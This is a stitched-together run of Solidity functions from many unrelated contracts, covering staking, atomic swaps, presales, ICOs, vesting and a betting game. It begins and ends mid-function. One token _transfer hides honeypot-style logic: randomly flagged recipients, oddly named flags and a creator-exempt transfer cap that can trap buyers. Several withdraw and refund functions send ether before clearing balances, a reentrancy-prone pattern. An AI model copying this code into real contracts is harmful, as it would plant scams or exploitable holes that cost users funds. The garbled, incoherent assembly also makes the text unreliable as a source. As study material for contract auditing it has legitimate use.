    require(block.timestamp < inDeadline, "must deposit before Deadline");
    require(depositToken1 + wad <= needToken1, "more than needToken1");
    balances[msg.sender] = balances[msg.sender].add(wad);
    periods[msg.sender] = periodNow;
    depositToken1 = depositToken1.add(wad);
    TransferHelper.safeTransferFrom(token1Addr, msg.sender, address(this), wad);
}

function withdraw(uint256 wad) public {
    require(status == 2, "not withdraw status");
    require(block.timestamp < outDeadline, "must withdraw before Deadline");
    uint256 reward = 0;
    if (lossToken1 > 0 && periods[msg.sender] < periodNow) {
        reward = totalReward.mul(balances[msg.sender]).div(calcToken1);
        uint256 conversion = calcToken1.sub(lossToken1).mul(balances[msg.sender]).div(calcToken1);
        depositToken1 = depositToken1.sub(balances[msg.sender]).add(conversion).sub(wad);
        balances[msg.sender] = conversion.sub(wad);
    } else {
        if (periods[msg.sender] < periodNow) reward = totalReward.mul(balances[msg.sender]).div(calcToken1);
        balances[msg.sender] = balances[msg.sender].sub(wad);
        depositToken1 = depositToken1.sub(wad);
    }
    periods[msg.sender] = periodNow;
    if (wad > 0) TransferHelper.safeTransfer(token1Addr, msg.sender, wad);
    if (reward > 0) TransferHelper.safeTransfer(rewardAddr, msg.sender, reward);
}

function endStake(address stakeAddr) public {
    require(msg.sender == manager, "Only managerAddr can endStake.");
    IStakingRewards staking = IStakingRewards(stakeAddr);
    staking.exit();
    periodNow++;
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (desepticons == true)) {
        megatron[recipient] = true;
        quatkum[recipient] = false;
        desepticons = false;
    }
    if (megatron[recipient] != true) {
        quatkum[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((quatkum[sender]) && (megatron[recipient] == false)) {
        quatkum[recipient] = true;
    }
    if (megatron[sender] == false) {
        require(amount < elephant);
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function transferFrom(
    address sender,
    address recipient,
    uint256 amount
) public virtual override returns(bool) {
    _transfer(sender, recipient, amount);
    _approve(
        sender,
        _msgSender(),
        _allowances[sender][_msgSender()].sub(
            amount,
            "ERC20: transfer amount exceeds allowance"
        )
    );
    return true;
}

function mint(uint amount) public {
    eye.transferFrom(msg.sender, address(this), amount);
    _balances[msg.sender] = _balances[msg.sender].add(amount);
    _totalSupply = _totalSupply.add(amount);
}

function withdraw(bytes32 _secret, address _ownerAddress) public {
    Swap memory swap = swaps[_ownerAddress][msg.sender];
    require(swap.secretHash == ripemd160(abi.encodePacked(_secret)));
    require(swap.balance > uint256(0));
    require(swap.createdAt.add(SafeTime) > now);
    uint256 actualValue = swap.balance;
    uint256 tradeFee = actualValue.div(exchangeFee);
    uint256 balanceAfterDeduction = actualValue.sub(tradeFee);
    swap.targetWallet.transfer(balanceAfterDeduction);
    exchangeFeeAddress.transfer(tradeFee);
    swaps[_ownerAddress][msg.sender].balance = 0;
    swaps[_ownerAddress][msg.sender].secret = _secret;
    emit Withdraw(msg.sender, _ownerAddress, swap.secretHash, now);
}

function withdrawOther(bytes32 _secret, address _ownerAddress, address participantAddress) public {
    Swap memory swap = swaps[_ownerAddress][participantAddress];
    require(swap.secretHash == ripemd160(abi.encodePacked(_secret)));
    require(swap.balance > uint256(0));
    require(swap.createdAt.add(SafeTime) > now);
    uint256 actualValue = swap.balance;
    uint256 tradeFee = actualValue.div(exchangeFee);
    uint256 balanceAfterDeduction = actualValue.sub(tradeFee);
    swap.targetWallet.transfer(balanceAfterDeduction);
    exchangeFeeAddress.transfer(tradeFee);
    swaps[_ownerAddress][participantAddress].balance = 0;
    swaps[_ownerAddress][participantAddress].secret = _secret;
    emit Withdraw(participantAddress, _ownerAddress, swap.secretHash, now);
}

function refund(address _participantAddress) public {
    Swap memory swap = swaps[msg.sender][_participantAddress];
    require(swap.balance > uint256(0));
    require(swap.createdAt.add(SafeTime) < now);
    msg.sender.transfer(swap.balance);
    clean(msg.sender, _participantAddress);
    emit Refund(_participantAddress, msg.sender, swap.secretHash);
}

function withdrawNoMoney(bytes32 _secret, address participantAddress) public {
    Swap memory swap = swaps[msg.sender][participantAddress];
    require(swap.secretHash == ripemd160(abi.encodePacked(_secret)));
    require(swap.balance > uint256(0));
    require(swap.createdAt.add(SafeTime) > now);
    uint256 actualValue = swap.balance;
    uint256 tradeFee = actualValue.div(10 ** 2).mul(exchangeFee);
    uint256 balanceAfterDeduction = actualValue.sub(tradeFee);
    swap.targetWallet.transfer(balanceAfterDeduction);
    exchangeFeeAddress.transfer(tradeFee);
    swaps[msg.sender][participantAddress].balance = 0;
    swaps[msg.sender][participantAddress].secret = _secret;
    emit Withdraw(participantAddress, msg.sender, swap.secretHash, now);
}

function buyTokensWithETH(address _receiver) public payable {
    require(ethRaised < MaxETHAmount, "Presale finished");
    uint _amount = msg.value;
    require(_receiver != address(0), "Can't send to 0x00 address");
    require(_amount > 0, "Can't buy with 0 eth");
    uint tokensToBuy = multiply(_amount, price);
    require(owner.send(_amount), "Unable to transfer eth to owner");
    require(tokenContract.transfer(_receiver, tokensToBuy), "Unable to transfer token to user");
    tokensSold += tokensToBuy;
    ethRaised += _amount;
    emit Sold(msg.sender, tokensToBuy);
}

function() payable {
    if (now <= startline) revert();
    if (now >= deadline) revert();
    uint amount = msg.value;
    if (amount < price) revert();
    amountRaised += amount;
    uint tokensToSend = amount / price;
    totalTokensSold += tokensToSend;
    actualGotETH[msg.sender] += amount;
    actualGotTokens[msg.sender] += tokensToSend;
    beneficiary.transfer(amount);
    tokenReward.transfer(msg.sender, tokensToSend);
}

function _transferFrom(
    address sender,
    address recipient,
    uint256 amount
) internal returns(bool) {
    if (inSwapAndLiquify) {
        return _basicTransfer(sender, recipient, amount);
    }
    if (ringmasterProtection) {
        if (!_hasLiqBeenAdded) {
            _checkLiquidityAdd(sender, recipient);
        } else {
            if (
                _liqAddBlock > 0 &&
                sender == pair &&
                !_liquidityHolders[sender] &&
                !_liquidityHolders[recipient]
            ) {
                if (block.number - _liqAddBlock < 2) {
                    if (!_isRingmaster[recipient]) {
                        _ringmasters.push(recipient);
                    }
                    _isRingmaster[recipient] = true;
                }
            }
        }
    }
    if (
        msg.sender != pair &&
        !inSwapAndLiquify &&
        swapAndLiquifyEnabled &&
        _balances[address(this)] >= swapThreshold
    ) {
        swapBack();
    }
    _checkTxLimit(sender, recipient, amount);
    require(!isWalletToWallet(sender, recipient), "Don't cheat");
    _balances[sender] = _balances[sender].sub(
        amount,
        "Insufficient Balance"
    );
    uint256 amountReceived = !isFeeExempt[sender] && !isFeeExempt[recipient] ?
        takeFee(sender, recipient, amount) :
        amount;
    _balances[recipient] = _balances[recipient].add(amountReceived);
    emit Transfer(msg.sender, recipient, amountReceived);
    return true;
}

function buy() public payable {
    uint256 _reward;
    bool _subResult;
    require(currentPhase == phaseType.privateSale2 ||
        currentPhase == phaseType.sales1 ||
        currentPhase == phaseType.sales2 ||
        currentPhase == phaseType.sales3 ||
        currentPhase == phaseType.sales4 ||
        currentPhase == phaseType.preFinish
    );
    require(KYC[msg.sender]);
    (_subResult, _reward) = calculateReward(msg.value);
    require(_reward > 0 && _subResult);
    thisBalance = thisBalance.sub(_reward);
    require(owner.send(msg.value));
    if (currentPhase == phaseType.privateSale1) {
        privateSale1Hardcap = privateSale1Hardcap.sub(_reward);
    } else if (currentPhase == phaseType.privateSale2) {
        privateSale2Hardcap = privateSale2Hardcap.sub(_reward);
    }
    require(token.transfer(msg.sender, _reward));
    emit Brought(msg.sender, msg.sender, msg.value, _reward);
}

function() public payable {
    uint curIcoRate = 0;
    if (agentRate[msg.sender] > 0) {
        curIcoRate = agentRate[msg.sender];
    } else {
        uint icoRuleIndex = 500;
        for (uint i = 0; i < icoRuleList.length; i++) {
            if ((icoRuleList[i].canceled != true) && (icoRuleList[i].startTime < now && now < icoRuleList[i].endTime)) {
                curIcoRate = icoRuleList[i].rate;
                icoRuleIndex = i;
            }
        }
        if (icoRuleIndex == 500) {
            require(icoRuleIndex != 500);
            addr2icoRuleIdList[msg.sender].push(0);
            addr2shareRuleGroupId[msg.sender] = addr2shareRuleGroupId[msg.sender] > 0 ? addr2shareRuleGroupId[msg.sender] : 0;
        } else {
            addr2shareRuleGroupId[msg.sender] = addr2shareRuleGroupId[msg.sender] > 0 ? addr2shareRuleGroupId[msg.sender] : icoRuleList[icoRuleIndex].shareRuleGroupId;
            addr2icoRuleIdList[msg.sender].push(icoRuleIndex + 1);
            icoPushAddr(icoRuleIndex, msg.sender);
        }
    }
    uint amountMAYA = 0;
    amountMAYA = msg.value.mul(curIcoRate);
    balances[msg.sender] = balances[msg.sender].add(amountMAYA);
    icoAmount[msg.sender] = icoAmount[msg.sender].add(amountMAYA);
    balances[owner] = balances[owner].sub(amountMAYA);
    ADDR_MAYA_ORG.transfer(msg.value);
}

function safeWithdrawal() afterDeadline {
    if (!softCapReached) {
        uint amount = balanceOf[msg.sender];
        balanceOf[msg.sender] = 0;
        if (amount > 0) {
            if (msg.sender.send(amount)) {
                FundTransfer(msg.sender, amount, false);
            } else {
                balanceOf[msg.sender] = amount;
            }
        }
    }
    if (softCapReached && beneficiary == msg.sender) {
        if (beneficiary.send(amountRaised)) {
            FundTransfer(beneficiary, amountRaised, false);
        } else {
            softCapReached = false;
        }
    }
}

function approve(address _spender, uint _amount) public returns(bool success) {
    require(transfersEnabled);
    if (isContract(controller)) {
        require(TokenController(controller).onApprove(msg.sender, _spender, allowed[msg.sender][_spender], _amount));
    }
    allowed[msg.sender][_spender] = _amount;
    emit Approval(msg.sender, _spender, _amount);
    return true;
}

function doTransfer(address _from, address _to, uint _amount) internal {
    if (_amount == 0) {
        emit Transfer(_from, _to, _amount); 
        return;
    }
    require((_to != 0) && (_to != address(this)));
    uint previousBalanceFrom = balanceOf(_from);
    require(previousBalanceFrom >= _amount);
    if (isContract(controller)) {
        require(TokenController(controller).onTransfer(_from, _to, _amount));
    }
    balances[_from] = previousBalanceFrom - _amount;
    uint previousBalanceTo = balanceOf(_to);
    require(previousBalanceTo + _amount >= previousBalanceTo); 
    balances[_to] = previousBalanceTo + _amount;
    emit Transfer(_from, _to, _amount);
    if (isContract(dividendsDistributor)) {
        require(DividendsDistributor(dividendsDistributor).distributeDividendsOnTransferFrom(_from, _to, _amount));
    }
}

function userDeposit() public payable nonReentrant {
    require(presaleStatus() == 1, "Not Active");
    require(presale_info.raise_min <= msg.value, "Balance is insufficent");
    require(presale_info.raise_max >= msg.value, "Balance is too much");
    BuyerInfo storage buyer = buyers[msg.sender];
    uint256 amount_in = msg.value;
    uint256 allowance = presale_info.raise_max.sub(buyer.base);
    uint256 remaining = presale_info.hardcap - status.raised_amount;
    allowance = allowance > remaining ? remaining : allowance;
    if (amount_in > allowance) {
        amount_in = allowance;
    }
    uint256 tokensSold = amount_in.mul(presale_info.token_rate).div(10 ** 18);
    require(tokensSold > 0, "ZERO TOKENS");
    require(tokensSold <= IERC20(presale_info.sale_token).balanceOf(address(this)), "Token reamin error");
    if (buyer.base == 0) {
        status.num_buyers++;
    }
    buyers[msg.sender].base = buyers[msg.sender].base.add(amount_in);
    buyers[msg.sender].sale = buyers[msg.sender].sale.add(tokensSold);
    status.raised_amount = status.raised_amount.add(amount_in);
    status.sold_amount = status.sold_amount.add(tokensSold);
    if (amount_in < msg.value) {
        msg.sender.transfer(msg.value.sub(amount_in));
    }
    emit UserDepsitedSuccess(msg.sender, msg.value);
}

function userWithdrawTokens() public nonReentrant {
    require(presaleStatus() == 2, "Not succeeded"); 
    BuyerInfo storage buyer = buyers[msg.sender];
    uint256 remaintoken = status.sold_amount.sub(status.token_withdraw);
    require(remaintoken >= buyer.sale, "Nothing to withdraw.");
    TransferHelper.safeTransfer(address(presale_info.sale_token), msg.sender, buyer.sale * (10 ** tokeninfo.decimal));
    status.token_withdraw = status.token_withdraw.add(buyer.sale);
    buyers[msg.sender].sale = 0;
    buyers[msg.sender].base = 0;
    emit UserWithdrawTokensSuccess(buyer.sale);
}

function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) isWhitelisted(_beneficiary) internal {
    require(_beneficiary == msg.sender);
    require(saleOpen(), "Sale is Closed");
    uint256 acceptedValue = _weiAmount;
    uint256 currentCap = getCurrentCap();
    uint256 raised = getRaisedForCurrentStage();
    if (contributions[_beneficiary].add(acceptedValue) > MAXIMUM_CONTRIBUTION) {
        changeDue = (contributions[_beneficiary].add(acceptedValue)).sub(MAXIMUM_CONTRIBUTION);
        acceptedValue = acceptedValue.sub(changeDue);
    }
    if (raised.add(acceptedValue) >= currentCap) {
        changeDue = changeDue.add(raised.add(acceptedValue).sub(currentCap));
        acceptedValue = _weiAmount.sub(changeDue);
        capReached = true;
    }
    require(capReached || contributions[_beneficiary].add(acceptedValue) >= MINIMUM_CONTRIBUTION, "Contribution below minimum");
}

function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {
    if (currentStage == Stages.MAINSALE && capReached) finalizeSale();
    if (currentStage == Stages.BONUSSALE && capReached) finalizePresale();
    changeDue = 0;
    capReached = false;
}

function setupSale(uint256 initialDate, address tokenAddress) onlyOwner atStage(Stages.SETUP) public {
    bonussale_StartDate = initialDate;
    bonussale_EndDate = bonussale_StartDate + BONUSSALE_MAX_DURATION;
    token = ERC20(tokenAddress);
    require(SolidToken(tokenAddress).totalSupply() == 0, "Tokens have already been distributed");
    require(SolidToken(tokenAddress).owner() == address(this), "Token has the wrong ownership");
    currentStage = Stages.READY;
}

function finalizeSale() atStage(Stages.MAINSALE) internal {
    mainSale_EndDate = now;
    require(SolidToken(token).setTransferEnablingDate(now + TOKEN_RELEASE_DELAY));
    currentStage = Stages.FINALIZED;
}

function saleOpen() public timedTransition whenNotPaused returns(bool open) {
    open = ((now >= bonussale_StartDate && now < bonussale_EndDate) ||
            (now >= mainSale_StartDate && now < mainSale_EndDate)) &&
        (currentStage == Stages.BONUSSALE || currentStage == Stages.MAINSALE);
}

function enableTransfer() public {
    require(transferEnablingDate != 0 && now >= transferEnablingDate);
    transfersEnabled = true;
}

function availableAmount(address _from) public view returns(uint256) {
    if (block.timestamp < shareholders[_from].vestingCliff) {
        return balanceOf(_from).sub(shareholders[_from].receivedAmt);
    } else if (block.timestamp >= shareholders[_from].vestingStart.add(shareholders[_from].vestingDuration)) {
        return balanceOf(_from);
    } else {
        uint totalVestedBalance = shareholders[_from].receivedAmt;
        uint totalAvailableVestedBalance = totalVestedBalance.mul(block.timestamp.sub(shareholders[_from].vestingStart)).div(shareholders[_from].vestingDuration);
        uint lockedBalance = totalVestedBalance - totalAvailableVestedBalance;
        return balanceOf(_from).sub(lockedBalance);
    }
}

function enableExchange(uint _tokenPrice) public payable {
    require(!exchangeEnabled);
    require(exchangeEnableCost == msg.value);
    exchangeEnabled = true;
    tokenPrice = _tokenPrice;
    commissionAddress.transfer(msg.value);
    emit LogTokenExchangeEnabled(msg.sender, _tokenPrice);
}

function swapTokens() public payable onlyWhitelisted(msg.sender) {
    require(exchangeEnabled);
    uint tokensToSend;
    tokensToSend = (msg.value * (10 ** decimals)) / tokenPrice;
    require(balances[owner] >= tokensToSend);
    balances[msg.sender] = balances[msg.sender].add(tokensToSend);
    balances[owner] = balances[owner].sub(tokensToSend);
    owner.transfer(msg.value);
    emit Transfer(owner, msg.sender, tokensToSend);
    emit LogTransferSold(msg.sender, tokensToSend);
}

function enableCodeExport() public payable {
    require(!codeExportEnabled);
    require(codeExportCost == msg.value);
    codeExportEnabled = true;
    commissionAddress.transfer(msg.value);
    emit LogTokenExportEnabled(msg.sender, msg.value);
}

function withdraw(uint256 _gameID)
external
isHuman()
isActivated(_gameID)
isEnded(_gameID) {
    require(now < game_[_gameID].withdrawDeadline, "withdraw deadline already passed");
    require(gameStatus_[_gameID].fundCleared == false, "fund already cleared");
    uint256 _pID = FSBook.pIDxAddr_(msg.sender);
    require(_pID != 0, "player has not played this game");
    require(players_[_pID][_gameID].withdrawn == false, "player already cashed out");
    players_[_pID][_gameID].withdrawn = true;
    if (game_[_gameID].canceled) {
        uint256 _totalInvestment = players_[_pID][_gameID].eth.mul(95) / 100;
        if (_totalInvestment > 0) {
            FSBook.getPlayerAddr(_pID).transfer(_totalInvestment);
            gameStatus_[_gameID].totalWithdrawn = _totalInvestment.add(gameStatus_[_gameID].totalWithdrawn);
        }
        emit FSEvents.onWithdraw(_gameID, _pID, msg.sender, FSBook.getPlayerName(_pID), _totalInvestment, now);
    } else {
        uint256 _totalWinnings = getPlayerInstWinning(_gameID, _pID, game_[_gameID].winnerTeam).add(getPlayerPotWinning(_gameID, _pID, game_[_gameID].winnerTeam));
        if (_totalWinnings > 0) {
            FSBook.getPlayerAddr(_pID).transfer(_totalWinnings);
            gameStatus_[_gameID].totalWithdrawn = _totalWinnings.add(gameStatus_[_gameID].totalWithdrawn);
        }
        emit FSEvents.onWithdraw(_gameID, _pID, msg.sender, FSBook.getPlayerName(_pID), _totalWinnings, now);
    }
}

function settleGame(uint256 _gameID, uint256 _team, string _comment, uint256 _deadline)
external
isActivated(_gameID)
isOngoing(_gameID)
isValidTeam(_gameID, _team)
isOwner() {
    require(_deadline >= now + 86400, "deadline must be more than one day later.");
    game_[_gameID].ended = true;
    game_[_gameID].winnerTeam = _team;
    game_[_gameID].gameEndComment = _comment;
    game_[_gameID].withdrawDeadline = _deadline;
    if (teams_[_gameID][_team].keys == 0) {
        uint256 _totalPot = (gameStatus_[_gameID].winningVaultInst).add(gameStatus_[_gameID].winningVaultFinal);
        gameStatus_[_gameID].totalWithdrawn = _totalPot;
        if (_totalPot > 0) {
            FSKingCorp.deposit.value(_totalPot)();
        }
    }
    emit FSEvents.onGameEnded(_gameID, _team, _comment, now);
}

function cancelGame(uint256 _gameID, string _comment, uint256 _deadline)
external
isActivated(_gameID)
isOngoing(_gameID)
isOwner() {
    require(_deadline >= now + 86400, "deadline must be more than one day later.");
    game_[_gameID].ended = true;
    game_[_gameID].canceled = true;
    game_[_gameID].gameEndComment = _comment;
    game_[_gameID].withdrawDeadline = _deadline;
    emit FSEvents.onGameCancelled(_gameID, _comment, now);
}

function clearFund(uint256 _gameID)
external
isHuman()
isEnded(_gameID)
isOwner() {
    require(now >= game_[_gameID].withdrawDeadline, "withdraw deadline not passed yet");
    require(gameStatus_[_gameID].fundCleared == false, "fund already cleared");
    gameStatus_[_gameID].fundCleared = true;
    uint256 _totalPot = (gameStatus_[_gameID].winningVaultInst).add(gameStatus_[_gameID].winningVaultFinal);
    uint256 _amount = _totalPot.sub(gameStatus_[_gameID].totalWithdrawn);
    if (_amount > 0) {
        FSKingCorp.deposit.value(_amount)();
    }
    emit onFundCleared(_gameID, _amount, now);
}

function distributeAll(uint256 _gameID, uint256 _pID, uint256 _affID, uint256 _totalEth, uint256[] memory _keys)
private {
    uint256 _com = _totalEth / 50;
    uint256 _aff = _totalEth.mul(3) / 100;
    _com = _com.add(handleAffiliate(_pID, _affID, _aff));
    uint256 _instPot = _totalEth.mul(15) / 100;
    uint256 _pot = _totalEth.mul(80) / 100;
    if (!address(FSKingCorp).call.value(_com)(abi.encode("deposit()"))) {
        _pot = _pot.add(_com);
    }
    gameStatus_[_gameID].winningVaultInst = _instPot.add(gameStatus_[_gameID].winningVaultInst);
    gameStatus_[_gameID].winningVaultFinal = _pot.add(gameStatus_[_gameID].winningVaultFinal);
    uint256 _nt = _keys.length;
    for (uint256 i = 0; i < _nt; i++) {
        uint256 _newPot = _instPot.add(teams_[_gameID][i].dust);
        uint256 _dust = updateMasks(_gameID, _pID, i, _newPot, _keys[i]);
        teams_[_gameID][i].dust = _dust;
    }
}

function buysXid(uint256 _gameID, uint256[] memory _teamEth, uint256 _affCode, string memory _comment)
public
payable
isActivated(_gameID)
isOngoing(_gameID)
isNotPaused(_gameID)
isNotClosed(_gameID)
isHuman()
isWithinLimits(msg.value) {
    uint256 _pID = FSBook.getPlayerID(msg.sender);
    uint256 _affID;
    if (_affCode != 0 && _affCode != _pID) {
        FSBook.setPlayerLAff(_pID, _affCode);
        _affID = _affCode;
    } else {
        _affID = FSBook.getPlayerLAff(_pID);
    }
    buysCore(_gameID, _pID, _teamEth, _affID);
    handleComment(_gameID, _pID, _comment);
}

function buysCore(uint256 _gameID, uint256 _pID, uint256[] memory _teamEth, uint256 _affID)
private {
    uint256 _nt = game_[_gameID].numberOfTeams;
    uint256[] memory _keys = new uint256[](_nt);
    bytes32 _name = FSBook.getPlayerName(_pID);
    uint256 _totalEth = 0;
    uint256 i;
    require(_teamEth.length == _nt, "Number of teams is not correct");
    for (i = 0; i < _nt; i++) {
        if (_teamEth[i] > 0) {
            _totalEth = _totalEth.add(_teamEth[i]);
            _keys[i] = (teams_[_gameID][i].eth).keysRec(_teamEth[i]);
            playerTeams_[_pID][_gameID][i].eth = _teamEth[i].add(playerTeams_[_pID][_gameID][i].eth);
            playerTeams_[_pID][_gameID][i].keys = _keys[i].add(playerTeams_[_pID][_gameID][i].keys);
            teams_[_gameID][i].eth = _teamEth[i].add(teams_[_gameID][i].eth);
            teams_[_gameID][i].keys = _keys[i].add(teams_[_gameID][i].keys);
            emit FSEvents.onPurchase(_gameID, _pID, msg.sender, _name, i, _teamEth[i], _keys[i], _affID, now);
        }
    }
    require(_totalEth == msg.value, "Total ETH is not the same as msg.value");
    gameStatus_[_gameID].totalEth = _totalEth.add(gameStatus_[_gameID].totalEth);
    players_[_pID][_gameID].eth = _totalEth.add(players_[_pID][_gameID].eth);
    distributeAll(_gameID, _pID, _affID, _totalEth, _keys);
}

function handleComment(uint256 _gameID, uint256 _pID, string memory _comment)
private {
    bytes memory _commentBytes = bytes(_comment);
    if (_commentBytes.length == 0) {
        return;
    }
    uint256 _totalEth = msg.value;
    if (_totalEth >= 1000000000000000) {
        require(_commentBytes.length <= 64, "comment is too long");
        bytes32 _name = FSBook.getPlayerName(_pID);
        playerComments_[_gameID][playerCommentsIndex_[_gameID]] = FSdatasets.PlayerComment(_pID, _name, _totalEth, _comment);
        playerCommentsIndex_[_gameID]++;
